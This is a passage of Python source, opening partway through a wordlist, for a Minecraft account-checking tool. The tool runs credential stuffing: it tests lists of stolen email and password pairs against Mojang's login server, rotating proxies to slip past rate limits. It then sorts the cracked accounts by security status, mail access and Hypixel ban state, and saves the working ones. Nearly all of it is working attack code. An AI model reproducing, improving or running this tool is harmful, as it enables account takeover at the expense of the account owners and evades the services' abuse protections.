somehow
someone
something
sometime
sometimes
somewhat
somewhere
son
song
soon
sophisticated
sorry
sort
soul
sound
soup
source
south
southeast
southern
southwest
sovereignty
soviet
space
spanish
spare
spark
speak
speaker
special
specialist
specialize
specialty
species
specific
specifically
specify
spectacular
spectrum
speculate
speculation
speech
speed
spell
spend
spending
sphere
spill
spin
spine
spirit
spiritual
spit
spite
split
spoke
spokesman
sponsor
spoon
sport
spot
spouse
spray
spread
spring
sprinkle
spy
squad
square
squeeze
stability
stable
stack
stadium
staff
stage
stair
stake
stance
stand
standard
standing
star
stare
start
starter
starting
state
statement
station
statistical
statistics
statue
status
statute
stay
stead
steadily
steady
steak
steal
steam
steel
steep
steer
stem
step
stereotype
stick
stiff
still
stimulate
stimulus
stir
stock
stomach
stone
stood
stop
storage
store
storm
story
stove
straight
straighten
strain
strange
stranger
strategic
strategy
straw
streak
stream
street
strength
strengthen
stress
stretch
strict
strictly
strike
striking
string
strip
stroke
strong
strongly
structural
structure
struggle
student
studio
study
stuff
stumble
stupid
style
subject
submit
subsequent
subsidy
substance
substantial
substantially
subtle
subtract
suburb
suburban
succeed
success
successful
successfully
such
suck
sudden
suddenly
sue
suffer
suffering
sufficient
suffix
sugar
suggest
suggestion
suicide
suit
suitable
suite
sum
summary
summer
summit
sun
sunlight
sunny
super
superior
supermarket
supervisor
supplier
supply
support
supporter
supportive
suppose
supposed
supposedly
supreme
sure
surely
surface
surgeon
surgery
surprise
surprised
surprising
surprisingly
surround
surrounding
surveillance
survey
survival
survive
survivor
suspect
suspend
suspicion
suspicious
sustain
sustainable
swallow
swear
sweat
sweater
sweep
sweet
swell
swim
swimming
swing
switch
sword
syllable
symbol
symbolic
sympathy
symptom
syndrome
system
t-shirt
table
tablespoon
tackle
tactic
tag
tail
take
tale
talent
talented
talk
tall
tank
tap
tape
target
task
taste
tax
taxpayer
tea
teach
teacher
teaching
team
teammate
tear
teaspoon
technical
technician
technique
technological
technology
teen
teenage
teenager
teeth
telephone
telescope
television
tell
temperature
temple
temporary
ten
tend
tendency
tender
tennis
tension
tent
term
terms
terrain
terrible
terribly
terrific
territory
terror
terrorism
terrorist
test
testify
testimony
testing
text
textbook
texture
than
thank
thanks
thanksgiving
that
theater
their
theirs
them
theme
themselves
then
theological
theology
theoretical
theory
therapist
therapy
there
thereby
therefore
these
they
thick
thigh
thin
thing
think
thinking
third
thirty
this
thoroughly
those
though
thought
thousand
thread
threat
threaten
three
threshold
thrive
throat
through
throughout
throw
thumb
thus
ticket
tide
tie
tight
tighten
tightly
tile
till
timber
time
timing
tiny
tip
tire
tired
tissue
title
to
tobacco
today
toe
together
toilet
told
tolerance
tolerate
toll
tomato
tomorrow
tone
tongue
tonight
too
took
tool
tooth
top
topic
toss
total
totally
touch
touchdown
tough
tour
tourism
tourist
tournament
toward
towards
towel
tower
town
toxic
toy
trace
track
trade
trading
tradition
traditional
traditionally
traffic
tragedy
tragic
trail
trailer
train
trainer
training
trait
transaction
transfer
transform
transformation
transit
transition
translate
translation
transmission
transmit
transport
transportation
trap
trash
trauma
travel
traveler
tray
treasure
treat
treatment
treaty
tree
tremendous
trend
trial
triangle
tribal
tribe
trick
trigger
trim
trip
triumph
troop
tropical
trouble
troubled
truck
true
truly
trunk
trust
truth
try
tube
tuck
tumor
tune
tunnel
turkey
turn
tv
twelve
twentieth
twenty
twice
twin
twist
two
two-thirds
type
typical
typically
ugly
uh
ultimate
ultimately
unable
uncertain
uncertainty
uncle
uncomfortable
uncover
under
undergo
undergraduate
underlying
undermine
understand
understanding
undertake
unemployment
unexpected
unfair
unfold
unfortunately
unhappy
uniform
union
unique
unit
unite
united
unity
universal
universe
university
unknown
unless
unlike
unlikely
unprecedented
until
unusual
up
update
upon
upper
upset
upstairs
urban
urge
us
use
used
useful
user
usual
usually
utility
utilize
vacation
vaccine
vacuum
valid
validity
valley
valuable
value
van
vanish
variable
variation
variety
various
vary
vast
vegetable
vehicle
vendor
venture
verb
verbal
verdict
version
versus
vertical
very
vessel
veteran
via
victim
victory
video
view
viewer
village
violate
violation
violence
violent
virtual
virtually
virtue
virus
visible
vision
visit
visitor
visual
vital
vitamin
vocal
voice
volume
voluntary
volunteer
vote
voter
voting
vowel
vs
vulnerable
wage
wagon
waist
wait
wake
walk
walking
wall
wander
want
war
warehouse
warm
warmth
warn
warning
warrior
was
wash
waste
watch
water
wave
way
we
weak
weaken
weakness
wealth
wealthy
weapon
wear
weather
weave
web
wedding
weed
week
weekend
weekly
weigh
weight
weird
welcome
welfare
well
well-being
well-known
went
were
west
western
wet
whale
what
whatever
wheat
wheel
wheelchair
when
whenever
where
whereas
wherever
whether
which
while
whip
whisper
white
who
whoever
whole
whom
whose
why
wide
widely
widespread
widow
wife
wild
wilderness
wildlife
will
willing
willingness
win
wind
window
wine
wing
winner
winter
wipe
wire
wisdom
wise
wish
with
withdraw
withdrawal
within
without
witness
wolf
woman
women
wonder
wonderful
wood
wooden
word
work
worker
working
workout
workplace
works
workshop
world
worldwide
worried
worry
worse
worst
worth
would
wound
wow
wrap
wrist
write
writer
writing
written
wrong
wrote
yard
yeah
year
yell
yellow
yes
yesterday
yet
yield
you
young
youngster
your
yours
yourself
yourselves
youth
zone
zero
todog
hydra'''

while True:
    try:
        config = full_load(open('config\config.yml', 'r', errors='ignore'))
        break
    except FileNotFoundError:
        print(f'{Fore.CYAN}[Config] Creating Config{Fore.RESET}')
        if not path.exists('config'):
            mkdir('config')
        open('config\config.yml', 'w').write(default_values)
        open('config\og-name.txt', 'w').write(ogname)
        print(f'{Fore.CYAN}[Config] {Fore.GREEN}Created')
        system('cls')

class banchecker:
    unbanned = 0
    nfa = 0
    sfa = 0
    tempbanned = 0
    banned = 0
    checked = 0
    bad = 0


class counter:
    mailaccessss = 0
    bad = 0
    cpm = 0
    untilsleep = 0
    goodlines = 0
    badlines = 0


class Counter:
    proxycpm = 0
    nfa = 0
    sfa = 0
    badd = 0
    unfa = 0
    hits = 0
    bad = 0
    optifine = 0
    mojang = 0
    labymod = 0
    liquidbounce = 0
    ogname = 0
    badproxies = 0
    hivemcrank = 0
    hypixelrank = 0
    mineplex_ranked = 0
    hypixelhl = 0
    mineplex_leveled = 0
    one = 0
    eleven = 0
    twenty = 0
    hivelevel = 0
    emailaccess = 0
    cpm = 0
    nohypixel = 0
    uhccoin = 0
    swcoin = 0
    bwcoin = 0
    veltrank = 0
    mojangunbanned = 0
    mojangbanned = 0
    invalid = 0
    total = 0
    wynncraft = 0
    hitspercent = 0
    failedpercent = 0
    checkedpercent = 0
    guess = 0
    ma = 0
    hl = 0
    sf = 0
    nf = 0
    of = 0
    mj = 0
    hr = 0
    vr = 0
    lbm = 0
    pog = 0
    profit = 0
    hr1 = 0
    nomineplex = 0
    changed = 0
    skipped = 0

class Main:
    def __init__(self):
        self.unix = str(strftime('-[%d-%m-%Y %H-%M-%S]'))
        self.email = r'[\w.-]+@[\w.-]+'
        self.extracted = '\nSaved extracted'
        self.created = str(strftime('-[%m-%d-%Y %H-%M-%S]'))
        config = RawConfigParser()
        self.domain_list = self.lisr()
        config.read_file(open(r'config/config.txt'))
        disable_warnings()
        self.version = '1.0'
        self.printing = Queue()
        self.caputer = Queue()
        self.start_time = 0
        self.hits = Queue()
        self.bad = Queue()
        self.useragent = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36'}
        self.mailheaders = {
            'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0', 'Pragma': 'no-cache'}
        self.mcurl = 'https://authserver.mojang.com/authenticate'
        self.jsonheaders = {
            "Content-Type": "application/json", 'Pragma': 'no-cache'}
        self.secureurl = 'https://api.mojang.com/user/security/challenges'
        self.rankhv = compilee(r'class=\"rank.*\">(.*)<')
        self.veltrank = compilee(r'<h2 style=\"color: .*\">(.*)</h2>')
        self.levelmp = compilee(r'>Level (.*)</b>')
        self.rankmp = compilee(r'Rank\(\'(.*)\'\)')
        self.debug = Checker.debug
        self.baddd = []
        self.savebad = Checker.save_bad
        self.hypl = Checker.Level.hypixel
        self.hypr = Checker.Rank.hypixel_rank
        self.uhc = Checker.Uhc.uhc
        self.uhcminc = Checker.Uhc.uhcminc
        self.swcheck = Checker.Skywars.skywars
        self.swcoins = Checker.Skywars.scoins
        self.bedwars = Checker.Bedwars.bedwars
        self.proxyapi = Checker.Proxy.proxy_api
        self.bwlevel = Checker.Bedwars.bwlevel
        self.api_link = Checker.Proxy.proxy_api_link
        self.rpcwork = 0
        self.Paused = False
        self.proxy_type = Checker.Proxy.type
        windll.kernel32.SetConsoleTitleW(
            f'Minecraft-{self.version} | Main menu')
        if Checker.RPC.discordrpc:
            try:
                client_id = '982193826770874408'
                RPC = Presence(client_id)
                RPC.connect()
                self.rpcwork = 1
            except:
                system('cls')
        import requests
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        try:
            lastver = 'Custom By Minh'
        except Exception as f:
            print(f'{Fore.RED}[ERROR]: {f}')
            sleep(5)
            exit()
        from colorama import Fore
        system('cls')
        if Checker.RPC.discordrpc and self.rpcwork == 1:
            RPC.update(details="Menu Checking", large_image="minecraft")
        print(t)
        print(f'''
{Fore.CYAN}|{Fore.WHITE}OPTIONS:

{Fore.WHITE}[{Fore.CYAN}1{Fore.WHITE}] Check Accounts {Fore.BLUE}| Normal Mode
{Fore.WHITE}[{Fore.CYAN}2{Fore.WHITE}] Banchecker {Fore.BLUE}| Banchecker for hypixel
{Fore.WHITE}[{Fore.CYAN}3{Fore.WHITE}] Scrape Proxies {Fore.BLUE}| Scrape proxies for checking
{Fore.WHITE}[{Fore.CYAN}4{Fore.WHITE}] Check Proxies {Fore.BLUE}| Check if your proxies are banned
{Fore.WHITE}[{Fore.CYAN}5{Fore.WHITE}] Mail Access {Fore.BLUE}| Check if your combos are mail access
{Fore.WHITE}[{Fore.CYAN}6{Fore.WHITE}] Exit{Fore.BLUE} | Close the checker
''')
        mode = input(f'{Fore.YELLOW} > ')

        if mode == "4":
            system('cls')
            print(t)
            windll.kernel32.SetConsoleTitleW(
                f'Minecraftchecker V{self.version} | Module: ProxyChecker')
            THREADS = Checker.ProxyChecker.pcthreads

            class Stats:
                invalid = 0
                banned = 0
                unbanned = 0

            def proxy_check(proxy):
                header = {
                    'User-Agent': UserAgent().chrome,
                    'Connection': 'close'
                }
                try:
                    r = scraper.get('https://authserver.mojang.com/authenticate', headers=header, proxies=proxy[1], timeout=Checker.ProxyChecker.pctimeout).text
                    if 'URI' in r:
                        Counter.mojangunbanned += 1
                        Counter.total += 1
                        open(f'{savepath}/Good.txt', 'a',
                             encoding='u8').write(f'{proxy[0]}\n')
                        self.prints(
                            f'{Fore.LIGHTGREEN_EX}Good | {proxy[0]} | {_type}')
                    else:
                        open(f'{savepath}/Bad.txt', 'a',
                             encoding='u8').write(f'{proxy[0]}\n')
                        Counter.total += 1
                        Counter.invalid += 1
                except:
                    open(f'{savepath}/Bad.txt', 'a',
                         encoding='u8').write(f'{proxy[0]}\n')
                    Counter.invalid += 1
                    Counter.total += 1

            if __name__ == '__main__':
                while True:
                    try:
                        print(f'{Fore.YELLOW}')
                        if Checker.RPC.discordrpc and self.rpcwork == 1:
                            RPC.update(details="ProxyChecker", large_image="minecraft")
                        proxies = input('[ProxyChecker] Proxy file:')
                        with open(proxies, "r", encoding="utf8", errors='igonre') as f:
                            proxylist = []
                            for proxy in f.readlines():
                                proxylist.append(proxy.strip())
                        break
                    except FileNotFoundError:
                        print(f'{Fore.LIGHTRED_EX}File not found: {proxies}')

                _type = str(input(
                    f'{Fore.YELLOW}[ProxyChecker] Proxy type: {Fore.CYAN}(HTTPS SOCKS4 SOCKS5):{Fore.YELLOW} ')).lower().strip()
                if _type == 'http' or _type == 'https':
                    def get_proxy():
                        for proxy in proxylist:
                            if proxy.count(':') == 3:
                                spl = proxy.split(':')
                                proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
                            yield [proxy, {'http': f"http://{proxy}", 'https': f"https://{proxy}"}]
                else:
                    def get_proxy():
                        for proxy in proxylist:
                            if proxy.count(':') == 3:
                                spl = proxy.split(':')
                                proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
                                line = f"{self.checktype}://{proxy}"
                            yield [proxy, {'http': f"{_type}://{proxy}", 'https': f"{_type}://{proxy}"}]

                unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
                savepath = f'Results/Proxychecker-{unix}'
                if not path.exists('Results'):
                    mkdir('Results')
                if not path.exists(savepath):
                    mkdir(savepath)

                stats = Stats()
                print('Starting...\n\n')
                Thread(target=self.proxy_cpm, daemon=True).start()
                windll.kernel32.SetConsoleTitleW(
                    f'Minecraft-{self.version} Starting | Minecraftproxy')
                Thread(target=self.proxytitle, daemon=True).start()
                with ThreadPool(THREADS) as pool:
                    res = pool.imap_unordered(proxy_check, get_proxy())
                    pool.close()
                    pool.join()
                from colorama import Fore
                system('cls')
                print(t)
                windll.kernel32.SetConsoleTitleW(
                    f'MinecraftChecker-{self.version} Done Checking | Minecraftproxy')
                symbo = f'{Fore.WHITE}[{Fore.LIGHTRED_EX}'
                symbo2 = f'{Fore.WHITE}[{Fore.LIGHTRED_EX}»{Fore.WHITE}]{Fore.LIGHTRED_EX}+{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                symbo3 = f'{Fore.WHITE}[{Fore.LIGHTRED_EX}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                symbol = f'{Fore.WHITE}[{Fore.CYAN}»{Fore.WHITE}]{Fore.RED}'
                print(f'{Fore.CYAN}')
                print(
                    f'-- {Fore.CYAN}Proxies Loaded: {Counter.total}{Fore.CYAN}')
                print(
                    f'-- {Fore.GREEN}Good Proxies: {Counter.mojangunbanned}{Fore.CYAN}')
                print(
                    f'-- {Fore.RED}Bad Proxies: {Counter.invalid}{Fore.CYAN}')
                print(f'{Fore.CYAN}')
            mode = input('Press ENTER to exit()')
            system('cls')
            exit()

        elif mode == "2":
            system('cls')
            import socket
            import socks
            import struct
            import select
            import os
            import requests
            import random
            import json
            import time
            from concurrent.futures import ThreadPoolExecutor, as_completed
            from io import BytesIO
            from cryptography.hazmat.primitives.serialization import load_der_public_key
            from cryptography.hazmat.backends import default_backend
            from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from hashlib import sha1

            requests.adapters.DEFAULT_RETRIES = 5

            SERVER = 'mc.hypixel.net'
            PORT = 25565
            windll.kernel32.SetConsoleTitleW(
                f'Minecraftchecker V{self.version} | Module: BanChecker')
            if Checker.RPC.discordrpc and self.rpcwork == 1:
                RPC.update(details="Menu BanCheck", large_image="minecraft")
            RETRIES = int(input('How many retries would you like: '))
            system('cls')

            class EncryptedSocket:
                def __init__(self, s, en, de):
                    self.s = s
                    self.encryptor = en
                    self.decryptor = de

                def recv(self, leng):
                    return self.decryptor.update(self.s.recv(leng))

                def send(self, d):
                    self.s.send(self.encryptor.update(d))

                def fileno(self):
                    return self.s.fileno()

                def close(self):
                    return self.s.close()

                def shutdown(self, *args, **kwds):
                    return self.s.shutdown(*args, **kwds)

            class EncryptedFileObject:
                def __init__(self, f, de):
                    self.f = f
                    self.decryptor = de

                def read(self, leng):
                    return self.decryptor.update(self.f.read(leng))

                def fileno(self):
                    return self.f.fileno()

                def close(self):
                    self.f.close()

            class PacketBuffer:
                def __init__(self):
                    self.bytes = BytesIO()

                def send(self, value):
                    self.bytes.write(value)

                def get_writable(self):
                    return self.bytes.getvalue()

                def reset_cursor(self):
                    self.bytes.seek(0)

                def read(self, length=None):
                    return self.bytes.read(length)

            def send_varint(value, s):
                out = bytes()
                while True:
                    byte = value & 0x7F
                    value >>= 7
                    out += struct.pack("B", byte | (0x80 if value > 0 else 0))
                    if value == 0:
                        break
                s.send(out)

            def read_varint(f):
                number = 0
                bytes_encountered = 0
                while True:
                    byte = f.read(1)
                    if len(byte) < 1:
                        raise EOFError("Unexpected end of message.")
                    byte = ord(byte)
                    number |= (byte & 0x7F) << 7 * bytes_encountered
                    if not byte & 0x80:
                        break
                    bytes_encountered += 1
                    if bytes_encountered > 5:
                        raise ValueError("Tried to read too long of a VarInt")
                return number

            def send_string(value, s):
                value = value.encode('utf-8')
                send_varint(len(value), s)
                s.send(value)

            def read_string(f):
                leng = read_varint(f)
                return f.read(leng).decode("utf-8")

            def send_unsigned_short(value, s):
                s.send(struct.pack('>H', value))

            def send_bytearray(value, s):
                send_varint(len(value), s)
                s.send(struct.pack(str(len(value)) + "s", value))

            def read_bytearray(f):
                leng = read_varint(f)
                return struct.unpack(str(leng) + "s", f.read(leng))[0]

            def handshake(s, host, port, state):
                packet_buffer = PacketBuffer()
                send_varint(0x00, packet_buffer)
                send_varint(47, packet_buffer)
                send_string(host, packet_buffer)
                send_unsigned_short(port, packet_buffer)
                send_varint(state, packet_buffer)
                send_varint(len(packet_buffer.get_writable()), s)
                s.send(packet_buffer.get_writable())

            def login_start(s, name):
                packet_buffer = PacketBuffer()
                send_varint(0x00, packet_buffer)
                send_string(name, packet_buffer)
                send_varint(len(packet_buffer.get_writable()), s)
                s.send(packet_buffer.get_writable())

            def encryption_response(s, shared_secret, verify_token):
                packet_buffer = PacketBuffer()
                send_varint(0x01, packet_buffer)
                send_bytearray(shared_secret, packet_buffer)
                send_bytearray(verify_token, packet_buffer)
                send_varint(len(packet_buffer.get_writable()), s)
                s.send(packet_buffer.get_writable())

            def read_packet(stream):
                ready = select.select([stream], [], [], 0.05)
                if ready:
                    length = read_varint(stream)
                    packet_data = PacketBuffer()
                    packet_data.send(stream.read(length))
                    while len(packet_data.get_writable()) < length:
                        packet_data.send(stream.read(
                            length - len(packet_data.get_writable())))
                    packet_data.reset_cursor()
                    packet_id = read_varint(packet_data)
                    packet = {}
                    if packet_id == 0:
                        packet['name'] = 'Disconnect'
                        packet['reason'] = read_string(packet_data)
                    elif packet_id == 1:
                        packet['name'] = 'Encryption Request'
                        packet['server_id'] = read_string(packet_data)
                        packet['public_key'] = read_bytearray(packet_data)
                        packet['verify_token'] = read_bytearray(packet_data)
                    elif packet_id == 3:
                        packet['name'] = 'Set Compression'
                        packet['threshold'] = read_varint(packet_data)
                    return packet

            def check_ban(username, password, proxy_addr, proxy_port, proxy_type, output_file):
                if 'socks' in proxy_type:
                    requests_proxy = {'http': '%s://%s:%s' % (proxy_type, proxy_addr, proxy_port),
                                      'https': '%s://%s:%s' % (proxy_type, proxy_addr, proxy_port)}
                else:
                    requests_proxy = {'http': 'http://%s:%s' % (proxy_addr, proxy_port),
                                      'https': 'https://%s:%s' % (proxy_addr, proxy_port)}
                rechecked = 0
                while True:
                    try:
                        headers = {
                            'Content-Type': 'application/json'
                        }
                        data = {
                            'agent': {
                                'name': 'Minecraft',
                                'version': 1
                            },
                            'username': username,
                            'password': password
                        }
                        r = scraper.post('https://authserver.mojang.com/authenticate',
                                         json=data, headers=headers, proxies=requests_proxy, timeout=20)
                        if 'selectedProfile' in r.text:
                            break
                        elif 'too many requests' in r.text or 'Request blocked' in r.text:
                            proxy_failed[proxy_addr] += 1
                            if proxy_failed[proxy_addr] > 5:
                                if {'address': proxy_addr, 'port': proxy_port} in proxies:
                                    proxies.remove(
                                        {'address': proxy_addr, 'port': proxy_port})
                        else:
                            rechecked += 1
                            if rechecked > RETRIES:
                                banchecker.bad += 1
                                banchecker.checked += 1
                                return f'{Fore.RED}[-] %s:%s' % (username, password)
                    except:
                        proxy_failed[proxy_addr] += 1
                        if proxy_failed[proxy_addr] > 5:
                            if {'address': proxy_addr, 'port': proxy_port} in proxies:
                                proxies.remove(
                                    {'address': proxy_addr, 'port': proxy_port})
                    finally:
                        new_proxy = random.choice(proxies)
                        proxy_addr = new_proxy['address']
                        proxy_port = new_proxy['port']
                        if 'socks' in proxy_type:
                            requests_proxy = {'http': '%s://%s:%s' % (proxy_type, proxy_addr, proxy_port),
                                              'https': '%s://%s:%s' % (proxy_type, proxy_addr, proxy_port)}
                        else:
                            requests_proxy = {'http': 'http://%s:%s' % (proxy_addr, proxy_port),
                                              'https': 'https://%s:%s' % (proxy_addr, proxy_port)}
                r = r.json()
                access_token = r['accessToken']
                selected_profile = r['selectedProfile']['id']
                name = r['selectedProfile']['name']
                sfa = self.securedcheck1(access_token)
                if sfa == '[]':
                    self.prints(f'{Fore.GREEN}[SFA] - {username}:{password}')
                    banchecker.sfa += 1
                else:
                    self.prints(f'{Fore.GREEN}[NFA] - {username}:{password}')
                    banchecker.nfa += 1
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(20)
                if proxy_type == 'socks4':
                    sock.set_proxy(socks.SOCKS4, proxy_addr,
                                   int(proxy_port), False)
                elif proxy_type == 'socks5':
                    sock.set_proxy(socks.SOCKS5, proxy_addr, int(proxy_port))
                else:
                    sock.set_proxy(socks.HTTP, proxy_addr, int(proxy_port))
                while True:
                    while True:
                        while True:
                            try:
                                sock.connect((SERVER, PORT))
                                break
                            except:
                                proxy_failed[proxy_addr] += 1
                                if proxy_failed[proxy_addr] > 5:
                                    if {'address': proxy_addr, 'port': proxy_port} in proxies:
                                        proxies.remove(
                                            {'address': proxy_addr, 'port': proxy_port})
                                new_proxy = random.choice(proxies)
                                proxy_addr = new_proxy['address']
                                proxy_port = new_proxy['port']
                                sock = socks.socksocket(
                                    socket.AF_INET, socket.SOCK_STREAM)
                                sock.settimeout(20)
                                if proxy_type == 'socks4':
                                    sock.set_proxy(
                                        socks.SOCKS4, proxy_addr, int(proxy_port), False)
                                elif proxy_type == 'socks5':
                                    sock.set_proxy(
                                        socks.SOCKS5, proxy_addr, int(proxy_port))
                                else:
                                    sock.set_proxy(
                                        socks.HTTP, proxy_addr, int(proxy_port))
                        file_object = sock.makefile('rb')
                        handshake(sock, SERVER, PORT, 2)
                        login_start(sock, name)
                        try:
                            res = read_packet(file_object)
                            break
                        except:
                            proxy_failed[proxy_addr] += 1
                            if proxy_failed[proxy_addr] > 5:
                                if {'address': proxy_addr, 'port': proxy_port} in proxies:
                                    proxies.remove(
                                        {'address': proxy_addr, 'port': proxy_port})
                            new_proxy = random.choice(proxies)
                            proxy_addr = new_proxy['address']
                            proxy_port = new_proxy['port']
                            sock = socks.socksocket(
                                socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(20)
                            if proxy_type == 'socks4':
                                sock.set_proxy(
                                    socks.SOCKS4, proxy_addr, int(proxy_port), False)
                            elif proxy_type == 'socks5':
                                sock.set_proxy(
                                    socks.SOCKS5, proxy_addr, int(proxy_port))
                            else:
                                sock.set_proxy(
                                    socks.HTTP, proxy_addr, int(proxy_port))
                    if res['name'] == 'Encryption Request':
                        shared_secret = os.urandom(16)
                        pubkey = load_der_public_key(
                            res['public_key'], default_backend())
                        encrypted_shared_secret = pubkey.encrypt(
                            shared_secret, PKCS1v15())
                        encrypted_verify_token = pubkey.encrypt(
                            res['verify_token'], PKCS1v15())
                        hash = sha1()
                        hash.update(res['server_id'].encode('utf-8'))
                        hash.update(shared_secret)
                        hash.update(res['public_key'])
                        server_id = format(int.from_bytes(
                            hash.digest(), byteorder='big', signed=True), 'x')
                        data = {
                            'accessToken': access_token,
                            'selectedProfile': selected_profile,
                            'serverId': server_id
                        }
                        headers = {
                            'Content-Type': 'application/json'
                        }
                        while (True):
                            try:
                                r = scraper.post('https://sessionserver.mojang.com/session/minecraft/join',
                                                 json=data, headers=headers, proxies=requests_proxy, timeout=20)
                                break
                            except:
                                proxy_failed[proxy_addr] += 1
                                if proxy_failed[proxy_addr] > 5:
                                    if {'address': proxy_addr, 'port': proxy_port} in proxies:
                                        proxies.remove(
                                            {'address': proxy_addr, 'port': proxy_port})
                                new_proxy = random.choice(proxies)
                                proxy_addr = new_proxy['address']
                                proxy_port = new_proxy['port']
                                if 'socks' in proxy_type:
                                    requests_proxy = {'http': '%s://%s:%s' % (proxy_type, proxy_addr, proxy_port),
                                                      'https': '%s://%s:%s' % (proxy_type, proxy_addr, proxy_port)}
                                else:
                                    requests_proxy = {'http': 'http://%s:%s' % (proxy_addr, proxy_port),
                                                      'https': 'https://%s:%s' % (proxy_addr, proxy_port)}
                        if r.status_code == 204:
                            encryption_response(
                                sock, encrypted_shared_secret, encrypted_verify_token)
                            cipher = Cipher(algorithms.AES(shared_secret), modes.CFB8(
                                shared_secret), backend=default_backend())
                            encryptor = cipher.encryptor()
                            decryptor = cipher.decryptor()
                            sock = EncryptedSocket(sock, encryptor, decryptor)
                            file_object = EncryptedFileObject(
                                file_object, decryptor)
                            try:
                                res = read_packet(file_object)
                                break
                            except:
                                proxy_failed[proxy_addr] += 1
                                if proxy_failed[proxy_addr] > 5:
                                    if {'address': proxy_addr, 'port': proxy_port} in proxies:
                                        proxies.remove(
                                            {'address': proxy_addr, 'port': proxy_port})
                                new_proxy = random.choice(proxies)
                                proxy_addr = new_proxy['address']
                                proxy_port = new_proxy['port']
                                sock = socks.socksocket(
                                    socket.AF_INET, socket.SOCK_STREAM)
                                sock.settimeout(20)
                                if proxy_type == 'socks4':
                                    sock.set_proxy(
                                        socks.SOCKS4, proxy_addr, int(proxy_port), False)
                                elif proxy_type == 'socks5':
                                    sock.set_proxy(
                                        socks.SOCKS5, proxy_addr, int(proxy_port))
                                else:
                                    sock.set_proxy(
                                        socks.HTTP, proxy_addr, int(proxy_port))
                        else:
                            sock.close()
                            banchecker.checked += 1
                            banchecker.bad += 1
                            return f'{Fore.RED}[-] {Fore.RED}%s:%s' % (username, password)
                    else:
                        sock.close()
                        banchecker.checked += 1
                        banchecker.bad += 1
                        return f'{Fore.RED}[-] {Fore.RED}%s:%s' % (username, password)
                sock.close()
                if res['name'] == 'Disconnect':
                    reason = res['reason']
                    if 'ban' in str(reason):
                        if 'permanently' in str(reason):
                            banchecker.banned += 1
                            banchecker.checked += 1
                            if 'Your account has a security alert' in str(reason):
                                return f'{Fore.RED}[+]  {Fore.LIGHTWHITE_EX}%s:%s{Fore.CYAN} | {Fore.LIGHTRED_EX}Security banned, BanID: %s' % (
                                username, password, json.loads(reason)['extra'][6]['text'])
                            else:
                                return f'{Fore.RED}[+]  {Fore.LIGHTWHITE_EX}%s:%s{Fore.CYAN} | {Fore.LIGHTRED_EX}Permanently banned' % (
                                username, password)
                        else:
                            banchecker.tempbanned += 1
                            banchecker.checked += 1
                            return f'{Fore.YELLOW}[+]  {Fore.LIGHTWHITE_EX}%s:%s {Fore.CYAN}| {Fore.YELLOW}Temporarily banned{Fore.LIGHTWHITE_EX} | {Fore.LIGHTYELLOW_EX} %s {Fore.CYAN}|{Fore.YELLOW} %s' % (
                            username, password, json.loads(reason)['extra'][1]['text'], SERVER)
                elif res['name'] == 'Set Compression':
                    banchecker.unbanned += 1
                    banchecker.checked += 1
                    with open(output_file, 'a+') as f:
                        f.write('%s:%s\n' % (username, password))
                    return f'{Fore.GREEN}[+]  {Fore.LIGHTWHITE_EX}%s:%s {Fore.CYAN}| {Fore.GREEN}Unbanned {Fore.CYAN}| %s' % (
                    username, password, SERVER)

            if __name__ == '__main__':
                alts = []
                proxies = []
                proxy_failed = {}
                print(t)
                windll.kernel32.SetConsoleTitleW(
                    f'MinecraftChecker-{self.version} Asking a few questions | BanChecker')
                flag = True
                while (flag):
                    print(f'{Fore.MAGENTA}')
                    alts_file = input(
                        f'{Fore.CYAN}Accounts file eg: alts.txt:')
                    if os.path.exists(alts_file) and os.path.isfile(alts_file):
                        with open(alts_file, 'r') as f:
                            for alt in f.readlines():
                                alt = alt.split(':')
                                if len(alt) >= 2:
                                    email = alt[0].strip()
                                    password = alt[1].strip()
                                    alts.append(
                                        {'email': email, 'password': password})
                            print(f'{Fore.GREEN}Loaded: %d Accounts' %
                                  len(alts))
                            flag = False
                    else:
                        print(f'{Fore.LIGHTRED_EX}File not found!')
                flag = True
                while (flag):
                    proxies_file = input(
                        f'{Fore.CYAN}Proxy file eg: proxies.txt:')
                    if os.path.exists(proxies_file) and os.path.isfile(proxies_file):
                        with open(proxies_file, 'r') as f:
                            for proxy in f.readlines():
                                proxy = proxy.split(':')
                                if len(proxy) >= 2:
                                    address = proxy[0].strip()
                                    port = proxy[1].strip()
                                    proxies.append(
                                        {'address': address, 'port': port})
                                    proxy_failed[address] = 0
                            print(f'{Fore.GREEN}Loaded: %d Proxies' %
                                  len(proxies))
                            flag = False
                    else:
                        print(f'{Fore.LIGHTRED_EX}File not found!')
                flag = True
                while (flag):
                    proxies_type = input(
                        f'{Fore.CYAN}Proxy type: socks4 / socks5 / http:')
                    if proxies_type != 'socks4' and proxies_type != 'socks5' and proxies_type != 'http':
                        print('Choose one of the following: socks4 / socks5 / http')
                    else:
                        print(f'{Fore.GREEN}Set the proxy type to: %s' %
                              proxies_type)
                        flag = False
                flag = True
                while (flag):
                    thread_num = int(
                        input(f'{Fore.MAGENTA}How many threads?:'))
                    if thread_num <= 0:
                        print(f'{Fore.LIGHTRED_EX}Number must be above 0!')
                    else:
                        print(f'{Fore.GREEN}Threads set to: %d' % thread_num)
                        flag = False
                executor = ThreadPoolExecutor(max_workers=thread_num)
                output = input(
                    f'{Fore.YELLOW}File to save unbanned accounts eg: unbanned.txt:')
                system('cls')
                print(t)
                windll.kernel32.SetConsoleTitleW(
                    f'MinecraftChecker-{self.version} | Checking | BanChecker')
                print(f'{Fore.CYAN}-- Server: {SERVER}')
                print(f'{Fore.CYAN}-- Port: {PORT}')
                print(f'{Fore.CYAN}-- Retries: {RETRIES}\n')
                print(
                    f'{Fore.MAGENTA}Might take a while for results to appear if using free proxies \n')
